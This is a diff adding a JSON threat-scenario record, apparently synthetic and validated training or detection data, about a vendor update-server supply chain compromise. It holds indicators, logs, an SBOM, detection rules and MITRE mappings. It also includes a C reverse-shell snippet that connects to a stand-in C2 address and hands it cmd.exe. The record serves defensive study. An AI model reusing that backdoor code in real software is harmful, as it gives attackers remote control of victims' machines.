@@ -1,0 +1,79 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Enterprise",
+        "nature": "supply_chain_compromise"
+      },
+      "example": {
+        "scenario": "A trusted third-party software vendor\u2019s update server was compromised, injecting a malicious backdoor into a widely deployed enterprise software package. This backdoor enabled remote code execution within customer environments when the software auto-updated.",
+        "technical_data": {
+          "software_update_http_request": "POST /update/check HTTP/1.1\r\nHost: updates.vendorcorp.com\r\nUser-Agent: VendorSoftUpdater/3.2.1\r\nContent-Type: application/json\r\nContent-Length: 145\r\n\r\n{\"product\":\"VendorSoft\",\"version\":\"3.2.1\",\"platform\":\"win64\",\"request_id\":\"5f4d2c3a-1234-5678-9abc-0deffedcba98\"}",
+          "software_update_http_response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 512\r\n\r\n{\"update_version\":\"3.2.2\",\"download_url\":\"https://updates.vendorcorp.com/files/VendorSoft_3.2.2_win64.exe\",\"sha256\":\"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\"}",
+          "malicious_binary_sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+          "malware_registry_changes": [
+            "HKLM\\SOFTWARE\\VendorSoft\\BackdoorEnabled = 1 (DWORD)",
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\VendorSoftUpdater = \"C:\\\\Program Files\\\\VendorSoft\\\\VendorSoftUpdater.exe\""
+          ],
+          "malicious_code_snippet_c": "void install_backdoor() {\n    WSADATA wsaData;\n    SOCKET sock;\n    struct sockaddr_in server;\n    WSAStartup(MAKEWORD(2,2), &wsaData);\n    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n    server.sin_family = AF_INET;\n    server.sin_addr.s_addr = inet_addr(\"198.51.100.42\"); // C2 server\n    server.sin_port = htons(443);\n    connect(sock, (struct sockaddr *)&server, sizeof(server));\n    // spawn cmd.exe and redirect input/output to socket\n    PROCESS_INFORMATION pi;\n    STARTUPINFO si = {0};\n    si.cb = sizeof(si);\n    si.dwFlags = STARTF_USESTDHANDLES;\n    si.hStdInput = (HANDLE)sock;\n    si.hStdOutput = (HANDLE)sock;\n    si.hStdError = (HANDLE)sock;\n    CreateProcess(NULL, \"cmd.exe\", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);\n}",
+          "network_packet_capture_excerpt": "Frame 123: 151 bytes on wire (1208 bits), 151 bytes captured (1208 bits)\nEthernet II, Src: 00:0c:29:4f:8e:35, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 192.168.1.100, Dst: 198.51.100.42\nTransmission Control Protocol, Src Port: 52344, Dst Port: 443, Seq: 1, Ack: 1, Len: 85\nEncrypted Payload (SSL/TLS)\n\nFrame 124: 74 bytes on wire (592 bits), 74 bytes captured (592 bits)\nEthernet II, Src: 00:50:56:c0:00:08, Dst: 00:0c:29:4f:8e:35\nInternet Protocol Version 4, Src: 198.51.100.42, Dst: 192.168.1.100\nTransmission Control Protocol, Src Port: 443, Dst Port: 52344, Seq: 1, Ack: 86, Len: 17\nEncrypted Payload (SSL/TLS)",
+          "event_logs": [
+            "2024-05-20T14:02:33Z VendorSoftUpdater[PID 4728]: Update check success: version 3.2.2 available",
+            "2024-05-20T14:02:35Z VendorSoftUpdater[PID 4728]: Downloaded update from https://updates.vendorcorp.com/files/VendorSoft_3.2.2_win64.exe, sha256 verified",
+            "2024-05-20T14:03:00Z SYSTEM Event ID 4688: New Process Created: cmd.exe, ParentProcessName: VendorSoftUpdater.exe, CommandLine: cmd.exe",
+            "2024-05-20T14:03:05Z Security Alert: Suspicious outbound TCP connection to 198.51.100.42:443 from VendorSoftUpdater.exe"
+          ],
+          "software_bill_of_materials_excerpt": {
+            "name": "VendorSoft",
+            "version": "3.2.2",
+            "dependencies": [
+              {
+                "name": "libcrypto",
+                "version": "1.1.1g",
+                "sha256": "c15f3a2e5a4f1d5f4f82a9a32d5e6e8b7f1d3e7d5e4f2a1b9c8d7e3f4a5b6c7d"
+              },
+              {
+                "name": "backdoor.dll",
+                "version": "1.0.0",
+                "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+              }
+            ]
+          }
+        },
+        "indicators": {
+          "hashes": [
+            "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+          ],
+          "ip_addresses": [
+            "198.51.100.42"
+          ],
+          "registry_keys": [
+            "HKLM\\SOFTWARE\\VendorSoft\\BackdoorEnabled",
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\VendorSoftUpdater"
+          ],
+          "processes": [
+            "VendorSoftUpdater.exe",
+            "cmd.exe (spawned by VendorSoftUpdater.exe)"
+          ],
+          "domains": [
+            "updates.vendorcorp.com"
+          ]
+        },
+        "detection_method": "Monitor software update integrity using SBOM to verify all dependencies and newly introduced binaries' hashes. Deploy endpoint detection rules to alert on unexpected process creation chains, such as VendorSoftUpdater.exe spawning cmd.exe. Network monitoring to detect outbound encrypted connections to anomalous IP addresses (198.51.100.42). Use EDR to detect registry persistence entries related to backdoor activation.",
+        "relevant_mitre_techniques": [
+          "T1195.001 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1059.003 - Command and Scripting Interpreter: Windows Command Shell",
+          "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+          "T1043 - Commonly Used Port"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a supply chain compromise scenario within an enterprise context. The scenario description clearly aligns with the problem nature by describing a trusted third-party vendor's update server being compromised to inject a malicious backdoor. The technical data is comprehensive and realistic, including HTTP request/response for software updates, malicious binary hash, registry changes, a malicious C code snippet illustrating the backdoor behavior, network capture excerpts showing communication with a C2 server, and event logs documenting suspicious activities. The inclusion of a software bill of materials (SBOM) excerpt with a malicious dependency ('backdoor.dll') supports the risk reduction strategy of tracking dependencies. Indicators are well detailed and directly linked to the malicious activity, providing clear evidence for detection. The detection method is thorough and aligns with recommended risk reduction strategies such as SBOM verification, endpoint detection, and network monitoring. Relevant MITRE ATT&CK techniques are correctly identified and appropriate for the scenario. Overall, the sample is complete, realistic, and correctly mapped to the supply chain compromise problem, making it a valid and high-quality example."
+      }
+    }
+  ]
+}
